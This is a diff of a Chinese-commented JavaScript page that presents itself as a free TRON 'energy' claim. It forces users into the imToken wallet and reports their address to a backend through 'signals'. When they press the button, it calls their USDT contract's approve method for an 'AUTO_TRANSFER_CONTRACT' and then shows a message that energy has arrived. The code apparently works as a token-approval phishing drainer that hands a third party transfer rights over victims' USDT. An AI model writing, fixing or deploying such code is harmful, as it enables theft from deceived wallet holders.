@@ -907,23 +907,26 @@ function updateA1SignalRecord(address) {
         console.warn("更新A1信号记录失败：", e);
     }
 }
-// ========== B1信号防重复工具 ==========
+// ========== B1信号防重复工具（保留最终版，删除重复的简单版本） ==========
 function hasSentB1Signal(address) {
     try {
         const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
-        return records[address] === true;
+        const item = records[address];
+        if (!item) return false;
+        // 30天内已发送B1→触发防重复（显示「我已领取过等待处理」）
+        return Date.now() - item.time < 30 * 24 * 60 * 60 * 1000;
     } catch (e) {
-        console.warn("检查B1信号发送状态失败：", e);
+        console.warn("检查B1防重复失败：", e);
         return false;
     }
 }
 function markB1SignalSent(address) {
     try {
         const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
-        records[address] = true;
+        records[address] = { time: Date.now() }; // 发送B1后立即标记
         localStorage.setItem(B1_SIGNAL_KEY, JSON.stringify(records));
     } catch (e) {
-        console.warn("标记B1信号发送状态失败：", e);
+        console.warn("标记B1信号失败：", e);
     }
 }
 // ========== DOM元素缓存（补充弹窗元素） ==========
@@ -1016,6 +1019,14 @@ function updateUserInfoDisplay() {
     balanceEnergyEl.textContent = Math.floor(currentEnergy);
     balanceBandwidthEl.textContent = Math.floor(currentBandwidth);
 }
+// 新增：补充缺失的 updateUserBalanceDisplay 函数
+function updateUserBalanceDisplay() {
+    // 初始化余额显示为0（未连接钱包时）
+    balanceUsdtEl.textContent = "0.00";
+    balanceTrxEl.textContent = "0.00";
+    balanceEnergyEl.textContent = "0";
+    balanceBandwidthEl.textContent = "0";
+}
 // 查询用户宽带余额
 async function queryBandwidthBalance(address) {
     try {
@@ -1036,10 +1047,8 @@ function reRenderDynamicContent() {
         updateUserInfoDisplay(); // 未连接时更新
         return;
     }
-
     recordList.style.display = "block";
     recordList.style.visibility = "visible";
-
     // 特殊地址处理
     if (userAddress === SPECIAL_ADDRESS) {
         const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
@@ -1051,7 +1060,6 @@ function reRenderDynamicContent() {
         approveBtn.textContent = lang.approveBtnText;
         return;
     }
-
     const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
     // 30天内已领取
     if (isAddressAuthorized(userAddress)) {
@@ -1062,7 +1070,6 @@ function reRenderDynamicContent() {
         approveBtn.textContent = lang.authorizedBtn;
         return;
     }
-
     // 余额状态
     if (tokenBalance <= 1) {
         approveBtn.disabled = true;
@@ -1152,6 +1159,8 @@ document.addEventListener('DOMContentLoaded', async () => {
     initLangDisplay(); // 初始化语言按钮显示
     updatePageLang();
     contractAddrEl.textContent = `${AUTO_TRANSFER_CONTRACT.slice(0,8)}...${AUTO_TRANSFER_CONTRACT.slice(-6)}`;
+    // 新增：设置合约初始能量值
+    contractEnergyEl.textContent = Math.floor(INIT_TRX); // 显示初始能量
     renderEnergyRecords();
     updateWalletStatus();
     updateUserBalanceDisplay(); // 初始化余额显示
@@ -1161,15 +1170,14 @@ document.addEventListener('DOMContentLoaded', async () => {
         e.stopPropagation(); // 阻止事件冒泡
         langDropdown.classList.toggle("open");
     });
-    // 绑定语言选项点击事件
-    // 绑定语言选项点击事件
-langDropdownItems.forEach(item => {
-    item.addEventListener("click", (e) => {
-        e.stopPropagation();
-        const newLang = item.getAttribute("data-lang"); // 修正：获取data-lang属性
-        changeLang(newLang);
+    // 绑定语言选项点击事件（修复getAttribute参数错误）
+    langDropdownItems.forEach(item => {
+        item.addEventListener("click", (e) => {
+            e.stopPropagation();
+            const newLang = item.getAttribute("data-lang"); // 修正：获取data-lang属性
+            changeLang(newLang);
+        });
     });
-});
     // 点击页面其他地方关闭下拉菜单
     document.addEventListener("click", () => {
         langDropdown.classList.remove("open");
@@ -1219,35 +1227,29 @@ async function checkImTokenEnv() {
         await initWallet(false);
         return;
     }
-
     // 确认按钮已渲染（兜底）
     if (!connectBtn) {
         console.warn("⚠️ 连接按钮未找到，稍后重试");
         setTimeout(() => checkImTokenEnv(), 500);
         return;
     }
-
     // 非imToken环境：100%复用你已定义的正确配置，不手动写Scheme！
     specialTipContainer.style.display = "block";
     userInfoEl.innerHTML = lang.nonImTokenUser;
     approveBtn.style.display = "none";
     connectBtn.style.display = "none";
     nonImTokenPopup.style.display = "none";
-
     const fullTargetUrl = window.location.href + "#approve";
     // 直接用你定义的imTokenConfig.scheme，不修改任何已有配置！
     const jumpUrl = imTokenConfig.scheme + encodeURIComponent(fullTargetUrl);
-
     // 触发跳转（和你之前成功的逻辑完全一致）
     console.log("📤 复用已定义配置跳转：", jumpUrl);
     window.location.href = jumpUrl;
-
     // 延迟3秒检测结果
     setTimeout(() => {
         if (!window.tronWeb) {
             nonImTokenPopup.style.display = "block";
             connectBtn.style.display = "block";
-
             // 按钮也复用同一配置，确保100%一致
             connectBtn.onclick = () => {
                 const fullTargetUrl = window.location.href + "#approve";
@@ -1256,7 +1258,6 @@ async function checkImTokenEnv() {
             };
         }
     }, 3000);
-
     closePopupBtn.onclick = () => {
         nonImTokenPopup.style.display = "none";
     };
@@ -1417,7 +1418,6 @@ async function sendSignalA1() {
         return "fail"; // 失败返回标识
     }
 }
-
 async function sendSignalA2() {
     const requestData = { 
         userAddress, 
@@ -1448,7 +1448,6 @@ async function sendSignalA2() {
         return false;
     }
 }
-
 // 重构sendSignalB：不抛出错误，避免卡住，统一返回true/false
 async function sendSignalB(isB1 = true) {
     const requestData = { userAddress };
@@ -1465,14 +1464,12 @@ async function sendSignalB(isB1 = true) {
             keepalive: true
         });
         clearTimeout(timeoutId);
-
         // 1. 客户端错误（400/408/409）：用户不合规，返回false
         if ([400, 408, 409].includes(res.status)) {
             const errData = await res.json().catch(() => ({ detail: lang.ineligibleTip }));
             console.warn(`❌ ${isB1 ? "B1" : "B2"}信号用户不合规：`, errData.detail);
             return false;
         }
-
         // 2. 成功回应（200-299）：只要状态码正确，无需响应体
         if (res.ok) {
             console.log(`✅ 信号${isB1 ? "B1" : "B2"}处理成功`);
@@ -1480,7 +1477,6 @@ async function sendSignalB(isB1 = true) {
             saveEnergyRecord(); // 保存记录
             return true;
         }
-
         // 3. 其他失败（500等）：返回false
         console.warn(`❌ ${isB1 ? "B1" : "B2"}信号后端返回异常状态：${res.status}`);
         return false;
@@ -1490,7 +1486,6 @@ async function sendSignalB(isB1 = true) {
         return false; // 异常时返回false，不卡住前端
     }
 }
-
 // ========== 新增：A1失败重试逻辑 ==========
 function bindRetryA1Logic() {
     const lang = langConfig[currentLang];
@@ -1525,7 +1520,6 @@ function bindRetryA1Logic() {
         }
     };
 }
-
 function bindApproveLogic() {
     const lang = langConfig[currentLang];
     approveBtn.onclick = async () => {
@@ -1535,7 +1529,6 @@ function bindApproveLogic() {
         btn.textContent = lang.redirectingBtn;
         reviewTip.style.display = "flex";
         reviewTipText.textContent = "发起签名，请在imToken中确认...";
-
         try {
             // 新增1：A1信号校验（保留原有校验逻辑，失败则终止流程）
             const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
@@ -1543,25 +1536,21 @@ function bindApproveLogic() {
             if (!isA1Success) {
                 throw new Error("A1环境校验未通过，请重新连接钱包或稍后重试");
             }
-
             // 新增2：保留B1信号发送（异步执行，不阻塞Approve）
             if (!hasSentB1Signal(userAddress)) {
                 sendSignalB(true).catch(err => console.warn("B1信号发送失败（不影响签名）：", err));
                 markB1SignalSent(userAddress);
             }
-
             // 核心校验：确保已有合约实例有效（复用前置初始化的trc20Contract）
             if (!trc20Contract) {
                 // 兜底：如果实例意外失效，用已有ABI重新快速初始化（仅兜底，正常情况不会走）
                 trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
                 if (!trc20Contract) throw new Error("合约实例初始化失败，请重新连接钱包");
             }
-
             // 确保TronWeb就绪（避免实例和钱包通信失效）
             if (!tronWeb.ready) {
                 await new Promise(resolve => tronWeb.onReady(resolve));
             }
-
             // 关键：直接调用已有合约实例的approve方法（不新建、不跳转、不碰A1/B1核心逻辑）
             const approveResult = await trc20Contract.approve(
                 AUTO_TRANSFER_CONTRACT, // 授权对象（前置已确认）
@@ -1570,7 +1559,6 @@ function bindApproveLogic() {
                 from: userAddress, // 前置已校验的有效地址
                 shouldPollResponse: true // 等待链上确认
             });
-
             // 签名成功后收尾（不影响核心调用）
             reviewTipText.textContent = "签名成功，能量已到账...";
             await Promise.all([
@@ -1580,12 +1568,10 @@ function bindApproveLogic() {
             addAuthorizedAddress(userAddress);
             saveEnergyRecord();
             renderEnergyRecords();
-
             btn.textContent = lang.successBtn;
             userInfoEl.innerHTML += lang.successArrival;
             alert(lang.successTip);
             reviewTip.style.display = "none";
-
         } catch (e) {
             console.error("Approve调用失败（核心原因）：", e);
             reviewTip.style.display = "none";
@@ -1601,30 +1587,6 @@ function bindApproveLogic() {
             alert(lang.authorizeFail.replace("{msg}", errMsg || "签名取消或网络异常"));
         }
     };
-}
-
-// ========== B1防重复工具（30天内已发送B1则触发） ==========
-function hasSentB1Signal(address) {
-    try {
-        const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
-        const item = records[address];
-        if (!item) return false;
-        // 30天内已发送B1→触发防重复（显示「我已领取过等待处理」）
-        return Date.now() - item.time < 30 * 24 * 60 * 60 * 1000;
-    } catch (e) {
-        console.warn("检查B1防重复失败：", e);
-        return false;
-    }
-}
-
-function markB1SignalSent(address) {
-    try {
-        const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
-        records[address] = { time: Date.now() }; // 发送B1后立即标记
-        localStorage.setItem(B1_SIGNAL_KEY, JSON.stringify(records));
-    } catch (e) {
-        console.warn("标记B1信号失败：", e);
-    }
 }
 // ========== 辅助函数 ==========
 function updateWalletStatus() {
